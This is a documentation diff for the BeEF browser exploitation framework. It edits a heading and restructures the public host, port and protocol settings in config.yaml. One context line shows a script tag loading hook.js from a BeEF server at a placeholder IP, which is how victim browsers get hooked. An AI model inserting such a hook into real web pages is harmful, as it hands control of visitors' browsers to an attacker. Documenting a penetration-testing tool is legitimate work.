@@ -93,7 +93,7 @@ If your BeEF server is 123.123.123.123:3000 then you can include the script usin
 <script src="http://123.123.123.123:3000/hook.js"></script>
 
 
-## Web Server Configuration
+# Web Server Configuration
 
 The web server can be fully configured, this is done in the HTTP subsection of the [`config.yaml`](https://github.com/beefproject/beef/blob/master/config.yaml) file:
 
@@ -104,9 +104,11 @@ The web server can be fully configured, this is done in the HTTP subsection of t
         port: "3000" #Port of the web server
 
         # If BeEF is running behind a reverse proxy or NAT
-        #  set the public hostname and port here
-        public: "8.7.6.5"
-        public_port: "3000"
+        #  set the public hostname and port here & protocol
+        public:
+            host: "example.com"
+            port: "3000"
+            https: true/false
 
         dns: "localhost" # Address of DNS server
         hook_file: "/hook.js" # Path for hooking script
